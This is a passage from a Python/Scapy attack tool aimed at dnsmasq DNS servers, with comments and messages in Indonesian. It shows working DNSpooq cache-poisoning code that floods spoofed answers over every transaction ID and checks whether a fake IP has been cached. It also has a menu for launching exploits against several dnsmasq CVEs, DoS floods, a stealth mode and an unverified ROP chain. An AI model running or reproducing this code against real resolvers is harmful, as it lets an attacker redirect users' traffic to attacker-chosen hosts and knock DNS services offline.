                    qr=1, aa=1, rd=1, ra=1,
                    qd=DNSQR(qname=spoof),
                    an=DNSRR(rrname=spoof, ttl=86400, rdata=fake)
                )
                send_packet(pkt, verbose=0)
        
        # [v2.1.2] PRE-FLOOD: Start flood FIRST, then trigger query
        # This ensures spoofed responses are already flying when Dnsmasq forwards
        print(f"[*] Pre-flooding: txid 0-65535, dport {PORT_RANGE_START}-{PORT_RANGE_END}")
        flood_threads = []
        txid_range = 65536
        chunk_size = txid_range // THREADS
        
        for i in range(THREADS):
            start = i * chunk_size
            end = start + chunk_size if i < THREADS - 1 else txid_range
            t = threading.Thread(target=flood_worker, args=(start, end))
            t.daemon = True
            t.start()
            flood_threads.append(t)
        
        # Trigger query AFTER flood has started (0.1s delay inside trigger_query)
        trigger_t = threading.Thread(target=trigger_query)
        trigger_t.daemon = True
        trigger_t.start()
        
        # Wait for all threads to finish
        for t in flood_threads:
            t.join()
        trigger_t.join()
        
        print(f"[+] Attempt {attempt} selesai: {txid_range} packets sprayed.")
        
        # === AUTO VERIFICATION (3x query for reliability) ===
        print(f"\n[*] Auto-Verifying (3 queries)...")
        time.sleep(0.5)
        
        results = []
        for v in range(3):
            try:
                verify = sr1(IP(dst=target_ip)/UDP(dport=53)/DNS(
                    rd=1, qd=DNSQR(qname=spoof)
                ), timeout=2, verbose=0)
                if verify and verify.haslayer(DNS) and verify.getlayer(DNS).ancount > 0:
                    r = str(verify.getlayer(DNS).an.rdata)
                    results.append(r)
                else:
                    results.append("NO_ANSWER")
            except:
                results.append("ERROR")
        
        # === SUMMARY TABLE ===
        poisoned_count = sum(1 for r in results if r == fake)
        print(f"\n{'='*55}")
        print(f"  VERIFICATION RESULT (Attempt {attempt})")
        print(f"{'='*55}")
        print(f"  Domain     : {spoof}")
        print(f"  Real IP    : {real_ip or 'unknown'}")
        print(f"  Fake IP    : {fake}")
        print(f"  {'─'*49}")
        for i, r in enumerate(results, 1):
            status = "✅ POISONED" if r == fake else ("⚠️  REAL" if r == real_ip else f"❌ {r}")
            print(f"  Query #{i}   : {r:<20s} {status}")
        print(f"  {'─'*49}")
        
        if poisoned_count == 3:
            print(f"  STATUS     : ✅ FULLY POISONED (3/3)")
            print(f"  TTL        : 86400s (~24 jam)")
            print(f"{'='*55}")
            print(f"\n[+] Cache poisoning BERHASIL! Semua query return fake IP.")
            print(f"[+] Device yang pakai DNS {target_ip} akan diarahkan ke {fake}.")
            return
        elif poisoned_count > 0:
            print(f"  STATUS     : ⚠️  PARTIAL ({poisoned_count}/3)")
            print(f"{'='*55}")
            print(f"[*] Partial success — mencoba lagi...")
        else:
            print(f"  STATUS     : ❌ NOT POISONED (0/3)")
            print(f"{'='*55}")
    
    print(f"\n{'='*55}")
    print(f"  FINAL: GAGAL setelah {rounds} attempt")
    print(f"{'='*55}")
    print(f"  Kemungkinan penyebab:")
    print(f"  1. Dnsmasq sudah di-patch (>= v2.83)")
    print(f"  2. Port range lebih luas dari {PORT_RANGE_START}-{PORT_RANGE_END}")
    print(f"  3. DNSSEC enabled → response ditolak tanpa signature")
    print(f"  4. Firewall/NAT memblokir spoofed packets")
    print(f"{'='*55}")

def run_vectors_2026(target_ip):
    """[v3.1] Menu vektor 2026 (CERT VU#471747) — probing non-flood + verdict jujur."""
    try:
        from vectors_2026 import VECTORS_2026
    except ImportError as e:
        print(f"[-] vectors_2026 tidak dapat di-import: {e}")
        return
    print(f"\n--- Vektor 2026 (fixed dnsmasq 2.90/2.92rel2) ---")
    for i, (name, desc, fn) in enumerate(VECTORS_2026, 1):
        print(f"  {i}. {name}: {desc}")
    print("  0. Kembali")
    choice = input("[?] Pilih vektor [0-5]: ").strip()
    if not choice.isdigit() or not (1 <= int(choice) <= len(VECTORS_2026)):
        return
    name, desc, fn = VECTORS_2026[int(choice) - 1]
    print(f"\n[*] Mengirim probe {name} ke {target_ip} (paket tunggal, non-flood)...")
    try:
        pkt = fn()
        pkt[IP].dst = target_ip
        send_packet(pkt)
        time.sleep(1.5)
        check_status_msg(target_ip, name)
        print("[i] Ingat: 'tidak respons' = indikasi; konfirmasi via log/uptime target.")
        print(f"[i] Fixed di dnsmasq 2.90+ (Debian 2.90-4~deb12u2 / 2.91-1+deb13u1).")
    except Exception as e:
        print(f"[-] {name} error: {e}")


def main():
    global STEALTH_MODE
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <IP_TARGET>")
        sys.exit(1)
    target_ip = sys.argv[1]
    
    # [FIX] Raw String for ASCII Art
    ascii_art = r"""
   __  __                  ___                 __ _            
  |  \/  | __ _ ___  __ _ / _ \__   _____ _ __/ _| | _____      __
  | |\/| |/ _` / __|/ _` | | | \ \ / / _ \ '__| |_| |/ _ \ \ /\ / /
  | |  | | (_| \__ \ (_| | |_| |\ V /  __/ |  |  _| | (_) \ V  V / 
  |_|  |_|\__,_|___/\__, |\___/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
                       |_|                                         
                          v3.0.0 (Threaded | Stealth | ROP) — PoC, unverified RCE
    """
    print(ascii_art)
    print(f" Target: {target_ip}")
    print("=" * 60)
    
    # [v2.1] Architecture selection at startup
    global SELECTED_ARCH
    print(f"\n[*] Select Target Architecture:")
    for i, (key, val) in enumerate(ARCH_PRESETS.items(), 1):
        default = " (default)" if key == SELECTED_ARCH else ""
        print(f"  {i}. {val['name']}{default}")
    arch_choice = input(f"[?] Architecture [1-{len(ARCH_PRESETS)}] (Enter=default): ").strip()
    if arch_choice.isdigit() and 1 <= int(arch_choice) <= len(ARCH_PRESETS):
        SELECTED_ARCH = list(ARCH_PRESETS.keys())[int(arch_choice) - 1]
    print(f"[+] Selected: {ARCH_PRESETS[SELECTED_ARCH]['name']}")
    
    while True:
        status_stealth = "ON" if STEALTH_MODE else "OFF"
        arch_name = ARCH_PRESETS[SELECTED_ARCH]['name']
        print(f"\n--- ATTACK VECTOR (Stealth: {status_stealth} | Arch: {arch_name}) ---")
        print("1. CVE-2017-14491 (Heap Overflow — attacker-DNS delivery)")
        print("2. CVE-2017-14492 (IPv6 RA Heap Overflow)")
        print("3. CVE-2017-14493 (DHCPv6 Stack Overflow)")
        print("4. CVE-2015-3294  (TCP Malformed Packet + Info Leak)")
        print("5. CVE-2017-13704 (Oversized EDNS0)")
        print("6. DNSpooq        (Cache Poisoning - TXID Brute)")
        print("7. TCP Exhaustion (DoS)          [BLOCKED by default]")
        print("8. Heavy DOS      (100MB Flood)  [BLOCKED by default]")
        print("-" * 30)
        print("9. [UNVERIFIED] ROP Chain Construction (PLACEHOLDER offsets — no RCE proof)")
        print("V. [2026] Vektor baru CERT VU#471747 (2291/4890/4891/4893/5172, fixed 2.90+)")
        print("S. Toggle Stealth Mode")
        print("A. Change Architecture")
        print("0. Exit")
        
        c = input("\n[?] Command > ").upper()
        
        if c == '1': exploit_cve_2017_14491(target_ip)
        elif c == '2': exploit_cve_2017_14492(target_ip)
        elif c == '3': exploit_cve_2017_14493(target_ip)
        elif c == '4': exploit_cve_2015_3294(target_ip)
        elif c == '5': exploit_cve_2017_13704(target_ip)
        elif c == '6': exploit_dnspooq(target_ip)
        elif c == '7': exploit_tcp_dos(target_ip)
        elif c == '8': exploit_heavy_buffer(target_ip)
        elif c == '9': exploit_cve_2017_14491_enhanced(target_ip)
        elif c == 'V': run_vectors_2026(target_ip)
        elif c == 'S': 
            STEALTH_MODE = not STEALTH_MODE
            print(f"[*] Stealth Mode toggled to: {STEALTH_MODE}")
        elif c == 'A':
            print(f"\n[*] Available Architectures:")
            for i, (key, val) in enumerate(ARCH_PRESETS.items(), 1):
                current = " <<<" if key == SELECTED_ARCH else ""
                print(f"  {i}. {val['name']}{current}")
            ac = input(f"[?] Select [1-{len(ARCH_PRESETS)}]: ").strip()
            if ac.isdigit() and 1 <= int(ac) <= len(ARCH_PRESETS):
                SELECTED_ARCH = list(ARCH_PRESETS.keys())[int(ac) - 1]
                print(f"[+] Architecture changed to: {ARCH_PRESETS[SELECTED_ARCH]['name']}")
        elif c == '0': break
        else: print("Invalid Code.")

if __name__ == "__main__":
    main()
